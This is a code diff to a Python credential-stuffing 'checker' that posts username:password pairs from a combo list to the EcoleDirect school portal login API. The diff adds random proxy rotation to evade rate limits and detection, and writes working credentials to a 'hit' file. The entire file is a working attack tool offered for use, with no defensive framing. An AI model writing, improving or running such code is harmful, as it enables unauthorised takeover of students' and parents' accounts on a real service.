@@ -5,6 +5,7 @@ from colorama import init,Fore
 from os import system
 import ctypes
 import threading
+import random
 init()
 
 system("cls ")
@@ -13,6 +14,7 @@ url = "https://api.ecoledirecte.com/v3/login.awp"
 headers = {}
 
 combo = open('combo.txt', "r")
+proxies = open("proxy.txt", "r", encoding="utf8").read().strip( ).splitlines()
 
 ctypes.windll.kernel32.SetConsoleTitleW(' [EcolDirect Checker | DK16#002 <3]   Loading...')  
 
@@ -32,27 +34,30 @@ lock = threading.Lock()
 def check():
     global good,bad
     for ligne in combo:
+        proxy = [{"https": "http://"+proxy} for proxy in proxies]
         acc = ligne.strip()
         user = acc.split(':')
-
         ################################################################################
         #a optimiser vraiment pas perforement 
         payload = "data={\n\t\"identifiant\": \"USER1\",\n\t\"motdepasse\": \"MDP2\"\n}"
         payload = payload.replace("USER1", user[0])
         payload = payload.replace("MDP2", user[1])
+        #print(payload)
         ################################################################################
-        r = requests.request("POST", url, headers=headers, data=payload)
+        r = requests.request("POST", url, headers=headers, data=payload,proxies=random.choice(proxy),timeout=10)
         time.sleep(0.1)
         y = json.loads(r.text)
         if y["code"] == 200:
             print(Fore.GREEN + "[+]Hit:",acc,"code:",y["code"])
-            hit = open("hit.txt", "a")
-            hit.write("\n")
-            hit.write(acc)
+            with open('hit.txt','a',encoding='utf-8') as hit:
+                hit.writelines(f'{acc}\n')
             good +=1 
-        else:
+        elif y["code"] == 505:
             print(Fore.RED + "[+]Bad:",acc,"code:",y["code"])
             bad +=1
+
+        else:
+            print(Fore.YELLOW + "[+]code not good:",acc,"code:",y["code"])
 
 
 
